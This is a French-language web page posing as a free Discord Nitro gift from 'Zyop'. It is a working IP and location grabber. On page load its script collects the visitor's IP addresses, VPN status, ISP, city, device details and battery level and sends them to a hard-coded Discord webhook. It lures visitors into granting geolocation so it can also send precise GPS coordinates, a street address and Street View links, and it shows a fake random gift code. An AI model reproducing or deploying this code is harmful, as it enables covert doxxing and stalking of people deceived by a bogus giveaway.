<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Tu as reçu un cadeau Discord Nitro 1 mois de Zyop ! Réclame ton abonnement maintenant pour des émojis personnalisés, avatars animés et plus !">
    <meta name="keywords" content="Discord Nitro, cadeau Nitro 1 mois, Zyop, Nitro giveaway, Discord">
    <meta name="author" content="Zyop">
    <meta property="og:title" content="Cadeau Discord Nitro 1 mois de Zyop">
    <meta property="og:description" content="Wow, Zyop t’a offert un abonnement Discord Nitro 1 mois ! Réclame-le vite pour profiter d’émojis personnalisés, d’uploads jusqu’à 100 Mo et de badges stylés !">
    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
    <meta property="og:image:alt" content="Image pour le cadeau Discord Nitro 1 mois">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://fake-doxbin.com">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Cadeau Discord Nitro 1 mois de Zyop">
    <meta name="twitter:description" content="Incroyable ! Zyop t’a envoyé un cadeau Discord Nitro 1 mois. Réclame-le vite pour débloquer des émojis personnalisés, avatars animés et bien plus !">
    <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
    <title>Cadeau Discord Nitro 1 mois - Zyop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #2f3136, #1a1b1e);
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        h1 {
            font-size: 48px;
            margin-bottom: 10px;
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
            animation: fadeIn 1s ease-in 0.3s both;
        }
        .button {
            padding: 15px 30px;
            border-radius: 8px;
            font-weight: bold;
            display: inline-block;
            margin: 10px;
            cursor: pointer;
            transition: transform 0.3s ease, background-color 0.3s ease;
        }
        .button:disabled {
            background-color: #666;
            cursor: not-allowed;
            transform: none;
        }
        .accept-button {
            background-color: #5865f2;
            color: #ffffff;
        }
        .accept-button:hover:not(:disabled) {
            background-color: #4752c4;
            transform: scale(1.05);
        }
        .refuse-button {
            background-color: #ff5555;
            color: #ffffff;
        }
        .refuse-button:hover:not(:disabled) {
            background-color: #cc4444;
            transform: scale(1.05);
        }
        a {
            color: #ffffff;
            text-decoration: none;
            padding: 15px 30px;
            border-radius: 8px;
            background-color: #5865f2;
            font-weight: bold;
            display: inline-block;
            margin-top: 20px;
            transition: transform 0.3s ease, background-color 0.3s ease;
        }
        a:hover {
            background-color: #4752c4;
            transform: scale(1.05);
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        .nitro-image {
            width: 100%;
            max-width: 150px;
            height: auto;
            border-radius: 8px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .loading {
            font-size: 16px;
            color: #aaa;
        }
        .error {
            font-size: 16px;
            color: #ff5555;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://products.eneba.games/resized-products/48OEiNNdBG7dQrXLQ4ssQU-MmuschrhPAeaGE_Tl8F8_95x140_2x-0.jpeg" alt="Discord Nitro Gift" class="nitro-image">
        <h1>Cadeau Discord Nitro 1 mois !</h1>
        <p>Wow, Zyop t’a offert un abonnement Discord Nitro 1 mois ! Autorise la géolocalisation pour réclamer ton cadeau et débloquer des émojis personnalisés, avatars animés et bien plus !</p>
        <div id="geo-prompt">
            <p>Autoriser la géolocalisation ?</p>
            <div class="button accept-button" id="accept-button" onclick="requestGeolocation()">Accepter</div>
            <div class="button refuse-button" id="refuse-button" onclick="refuseGeolocation()">Refuser</div>
        </div>
        <p id="status" class="loading" style="display: none;"></p>
        <div id="nitro-link-container" style="display: none;">
            <p>Ton lien Discord Nitro :</p>
            <a id="nitro-link" href="#">Copier le lien Nitro</a>
        </div>
    </div>

    <script>
        let locationRefusedSent = false;
        let visitSent = false;
        let isProcessing = false;

        function generateNitroCode() {
            const existingCode = sessionStorage.getItem('nitroCode');
            if (existingCode) return existingCode;
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 16; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            sessionStorage.setItem('nitroCode', code);
            return code;
        }

        function getDeviceInfo(userAgent) {
            let deviceName = 'Inconnu';
            let deviceModel = 'Inconnu';
            if (navigator.userAgentData) {
                navigator.userAgentData.getHighEntropyValues(['model', 'platform'])
                    .then(ua => {
                        deviceName = ua.platform || 'Inconnu';
                        deviceModel = ua.model || 'Inconnu';
                    })
                    .catch(e => console.error('Erreur userAgentData:', e));
            }
            userAgent = userAgent.toLowerCase();
            if (/iphone/.test(userAgent)) {
                deviceName = 'iPhone';
                if (/iphone.*cpu os ([0-9_]+)/.test(userAgent)) {
                    deviceModel = 'iPhone ' + (userAgent.match(/cpu os ([0-9_]+)/)[1]?.replace('_', '.') || 'Unknown');
                }
            } else if (/ipad/.test(userAgent)) {
                deviceName = 'iPad';
                deviceModel = 'iPad';
            } else if (/android/.test(userAgent)) {
                deviceName = 'Android';
                if (/android.*; ([a-z0-9\s-]+) build/.test(userAgent)) {
                    deviceModel = userAgent.match(/android.*; ([a-z0-9\s-]+) build/)[1] || 'Unknown';
                }
            } else if (/windows/.test(userAgent)) {
                deviceName = 'Windows PC';
                deviceModel = 'PC';
            } else if (/macintosh|mac os x/.test(userAgent)) {
                deviceName = 'Mac';
                deviceModel = 'Mac';
            }
            return { deviceName, deviceModel };
        }

        async function getAddressFromCoordinates(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
                    cache: 'no-store',
                    mode: 'cors'
                });
                if (!response.ok) throw new Error(`Nominatim API failed with status ${response.status}`);
                const data = await response.json();
                return data.display_name || 'Inconnu';
            } catch (e) {
                console.error('Erreur lors de la récupération de l\'adresse:', e);
                return 'Inconnu';
            }
        }

        async function sendToWebhook(data) {
            try {
                const response = await fetch('https://discordapp.com/api/webhooks/1372221976751505580/fG9zjBj_Itmq8AjRWgp0NwCxHLHYgf96IspFN8mPGoZTyQiSUs19_7aSvIIhctT30YmN', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    cache: 'no-store',
                    mode: 'cors'
                });
                if (!response.ok) throw new Error(`Webhook request failed with status ${response.status}`);
            } catch (error) {
                console.error('Erreur lors de l\'envoi au webhook:', error.message);
            }
        }

        async function collectDeviceInfo() {
            let ipv4 = 'Inconnu';
            let ipv6 = 'Inconnu';
            let ipForVpn = 'Inconnu';
            let ipAddress = 'Inconnu';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json', { cache: 'no-store', mode: 'cors' });
                if (!ipResponse.ok) throw new Error(`IPify API failed with status ${ipResponse.status}`);
                const ipData = await ipResponse.json();
                ipv4 = ipData.ip || 'Inconnu';
                ipForVpn = ipv4;
            } catch (e) {
                console.error('Erreur lors de la récupération de l\'IP:', e);
            }
            try {
                const ipv6Response = await fetch('https://api64.ipify.org?format=json', { cache: 'no-store', mode: 'cors' });
                if (!ipv6Response.ok) throw new Error(`IPify IPv6 API failed with status ${ipv6Response.status}`);
                const ipv6Data = await ipv6Response.json();
                if (ipv6Data.ip && ipv6Data.ip !== ipv4) {
                    ipv6 = ipv6Data.ip;
                    if (ipForVpn === 'Inconnu') ipForVpn = ipv6;
                }
            } catch (e) {
                console.error('Erreur lors de la récupération de l\'IPv6:', e);
            }
            let vpnDetected = false;
            if (ipForVpn !== 'Inconnu') {
                try {
                    const ipinfoResponse = await fetch(`https://ipinfo.io/json?token=174e32a50f972a`, { cache: 'no-store', mode: 'cors' });
                    if (!ipinfoResponse.ok) throw new Error(`IPinfo API failed with status ${ipinfoResponse.status}`);
                    const ipinfoData = await ipinfoResponse.json();
                    console.log(ipinfoData);
                    if (ipinfoData.privacy && (ipinfoData.privacy.vpn || ipinfoData.privacy.proxy)) {
                        console.log("VPN détecté !");
                        vpnDetected = true;
                    }
                } catch (e) {
                    console.error('Erreur lors de la vérification VPN/proxy:', e);
                }
            }
            let geoData = {};
            if (ipForVpn !== 'Inconnu') {
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ipForVpn}/json/`, { cache: 'no-store', mode: 'cors' });
                    if (!geoResponse.ok) throw new Error(`IPAPI request failed with status ${geoResponse.status}`);
                    geoData = await geoResponse.json();
                    ipAddress = geoData.ip || ipForVpn;
                } catch (e) {
                    console.error('Erreur lors de la récupération de la localisation:', e);
                }
            }
            const location = {
                city: geoData.city || 'Inconnu',
                region: geoData.region || 'Inconnu',
                country: geoData.country_name || 'Inconnu',
                latitude: geoData.latitude || 'Inconnu',
                longitude: geoData.longitude || 'Inconnu',
                org: geoData.org || 'Inconnu',
                asn: geoData.asn || 'Inconnu',
                ip_address: ipAddress
            };
            const userAgent = navigator.userAgent || 'Inconnu';
            const { deviceName, deviceModel } = getDeviceInfo(userAgent);
            const isMobile = /Mobi|Android/i.test(userAgent);
            const deviceType = isMobile ? 'Mobile' : 'Desktop';
            let batteryInfo = 'Non disponible';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${(battery.level * 100).toFixed(0)}% (En charge: ${battery.charging ? 'Oui' : 'Non'})`;
                } catch (e) {
                    console.error('Erreur lors de la récupération des infos de batterie:', e);
                }
            }
            const timestamp = new Date().toLocaleString('fr-FR', {
                timeZone: 'Europe/Paris',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            }).replace(',', '');
            return {
                ipv4, ipv6, ipForVpn, vpnDetected, location, userAgent, deviceName, deviceModel, deviceType, batteryInfo, timestamp
            };
        }

        async function requestGeolocation() {
            if (isProcessing) return;
            isProcessing = true;
            const geoPrompt = document.getElementById('geo-prompt');
            const statusElement = document.getElementById('status');
            const nitroLinkContainer = document.getElementById('nitro-link-container');
            const nitroLink = document.getElementById('nitro-link');
            const acceptButton = document.getElementById('accept-button');
            const refuseButton = document.getElementById('refuse-button');
            acceptButton.disabled = true;
            refuseButton.disabled = true;
            statusElement.style.display = 'block';
            statusElement.textContent = 'Chargement...';
            statusElement.className = 'loading';

            try {
                const deviceInfo = await collectDeviceInfo();
                const nitroCode = generateNitroCode();
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude } = position.coords;
                        const gpsAddress = await getAddressFromCoordinates(latitude, longitude);
                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        const streetViewLink = `https://www.google.com/maps/@${latitude},${longitude},3a,75y,90h,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192`;
                        geoPrompt.style.display = 'none';
                        statusElement.textContent = 'Géolocalisation acceptée ! Voici ton lien Nitro :';
                        statusElement.className = '';
                        nitroLinkContainer.style.display = 'block';
                        nitroLink.href = `https://discord.gift/${nitroCode}`;
                        nitroLink.textContent = `https://discord.gift/${nitroCode}`;
                        await sendToWebhook({
                            embeds: [{
                                title: 'Géolocalisation acceptée',
                                color: 0x00FF00,
                                fields: [
                                    { name: 'Adresse IP', value: deviceInfo.ipForVpn, inline: true },
                                    { name: 'Adresse IPv4', value: deviceInfo.ipv4, inline: true },
                                    { name: 'Adresse IPv6', value: deviceInfo.ipv6, inline: true },
                                    { name: 'VPN/Proxy', value: deviceInfo.vpnDetected ? 'Oui' : 'Non', inline: true },
                                    { name: 'FAI', value: deviceInfo.location.org || 'Inconnu', inline: true },
                                    { name: 'ASN', value: deviceInfo.location.asn || 'Inconnu', inline: true },
                                    { name: 'Ville', value: deviceInfo.location.city, inline: true },
                                    { name: 'Région', value: deviceInfo.location.region, inline: true },
                                    { name: 'Pays', value: deviceInfo.location.country, inline: true },
                                    { name: 'Coordonnées GPS', value: `${latitude}, ${longitude}`, inline: true },
                                    { name: 'Adresse GPS exacte', value: gpsAddress, inline: false },
                                    { name: 'Adresse IP exacte', value: deviceInfo.location.ip_address, inline: true },
                                    { name: 'Google Maps', value: googleMapsLink, inline: false },
                                    { name: 'Street View', value: streetViewLink, inline: false },
                                    { name: 'Nom de l\'appareil', value: deviceInfo.deviceName, inline: true },
                                    { name: 'Modèle de l\'appareil', value: deviceInfo.deviceModel, inline: true },
                                    { name: 'User Agent', value: deviceInfo.userAgent, inline: false },
                                    { name: 'Type d\'appareil', value: deviceInfo.deviceType, inline: true },
                                    { name: 'Batterie', value: deviceInfo.batteryInfo, inline: true },
                                    { name: 'Horodatage', value: deviceInfo.timestamp, inline: false }
                                ]
                            }]
                        });
                        isProcessing = false;
                    },
                    (error) => {
                        console.error('Erreur géolocalisation:', error);
                        statusElement.textContent = 'Erreur : Veuillez autoriser la géolocalisation.';
                        statusElement.className = 'error';
                        geoPrompt.style.display = 'block';
                        acceptButton.disabled = false;
                        refuseButton.disabled = false;
                        isProcessing = false;
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } catch (e) {
                console.error('Erreur lors de la collecte des données:', e);
                statusElement.textContent = 'Erreur lors de la collecte des données.';
                statusElement.className = 'error';
                geoPrompt.style.display = 'block';
                acceptButton.disabled = false;
                refuseButton.disabled = false;
                isProcessing = false;
            }
        }

        async function refuseGeolocation() {
            if (isProcessing) return;
            isProcessing = true;
            const geoPrompt = document.getElementById('geo-prompt');
            const statusElement = document.getElementById('status');
            const acceptButton = document.getElementById('accept-button');
            const refuseButton = document.getElementById('refuse-button');
            acceptButton.disabled = true;
            refuseButton.disabled = true;
            statusElement.style.display = 'block';
            statusElement.textContent = 'Chargement...';
            statusElement.className = 'loading';

            try {
                const deviceInfo = await collectDeviceInfo();
                if (!locationRefusedSent) {
                    await sendToWebhook({
                        embeds: [{
                            title: 'Géolocalisation refusée',
                            color: 0xFF0000,
                            fields: [
                                { name: 'Message', value: 'La géolocalisation a été refusée par l\'utilisateur.', inline: false },
                                { name: 'Adresse IP', value: deviceInfo.ipForVpn, inline: true },
                                { name: 'Adresse IPv4', value: deviceInfo.ipv4, inline: true },
                                { name: 'Adresse IPv6', value: deviceInfo.ipv6, inline: true },
                                { name: 'ASN', value: deviceInfo.location.asn || 'Inconnu', inline: true },
                                { name: 'Horodatage', value: deviceInfo.timestamp, inline: false }
                            ]
                        }]
                    });
                    locationRefusedSent = true;
                }
                statusElement.style.display = 'none';
                geoPrompt.style.display = 'block';
                acceptButton.disabled = false;
                refuseButton.disabled = false;
                isProcessing = false;
            } catch (e) {
                console.error('Erreur lors du refus de géolocalisation:', e);
                statusElement.textContent = 'Erreur lors du refus de géolocalisation.';
                statusElement.className = 'error';
                geoPrompt.style.display = 'block';
                acceptButton.disabled = false;
                refuseButton.disabled = false;
                isProcessing = false;
            }
        }

        window.onload = async () => {
            if (visitSent || isProcessing) return;
            isProcessing = true;
            const statusElement = document.getElementById('status');
            statusElement.style.display = 'block';
            statusElement.textContent = 'Chargement des données...';
            statusElement.className = 'loading';

            try {
                const deviceInfo = await collectDeviceInfo();
                await sendToWebhook({
                    embeds: [{
                        title: 'Nouvelle visite sur le site',
                        color: 0xFF0000,
                        fields: [
                            { name: 'Adresse IP', value: deviceInfo.ipForVpn, inline: true },
                            { name: 'Adresse IPv4', value: deviceInfo.ipv4, inline: true },
                            { name: 'Adresse IPv6', value: deviceInfo.ipv6, inline: true },
                            { name: 'VPN/Proxy', value: deviceInfo.vpnDetected ? 'Oui' : 'Non', inline: true },
                            { name: 'FAI', value: deviceInfo.location.org || 'Inconnu', inline: true },
                            { name: 'ASN', value: deviceInfo.location.asn || 'Inconnu', inline: true },
                            { name: 'Ville', value: deviceInfo.location.city, inline: true },
                            { name: 'Région', value: deviceInfo.location.region, inline: true },
                            { name: 'Pays', value: deviceInfo.location.country, inline: true },
                            { name: 'Coordonnées', value: `${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}`, inline: true },
                            { name: 'Adresse IP exacte', value: deviceInfo.location.ip_address, inline: true },
                            { name: 'Google Maps', value: `https://www.google.com/maps?q=${deviceInfo.location.latitude},${deviceInfo.location.longitude}`, inline: false },
                            { name: 'Nom de l\'appareil', value: deviceInfo.deviceName, inline: true },
                            { name: 'Modèle de l\'appareil', value: deviceInfo.deviceModel, inline: true },
                            { name: 'User Agent', value: deviceInfo.userAgent, inline: false },
                            { name: 'Type d\'appareil', value: deviceInfo.deviceType, inline: true },
                            { name: 'Batterie', value: deviceInfo.batteryInfo, inline: true },
                            { name: 'Horodatage', value: deviceInfo.timestamp, inline: false }
                        ]
                    }]
                });
                visitSent = true;
                statusElement.style.display = 'none';
                isProcessing = false;
            } catch (e) {
                console.error('Erreur lors de la visite initiale:', e);
                statusElement.textContent = 'Erreur lors du chargement des données.';
                statusElement.className = 'error';
                isProcessing = false;
            }
        };
    </script>
</body>
</html>
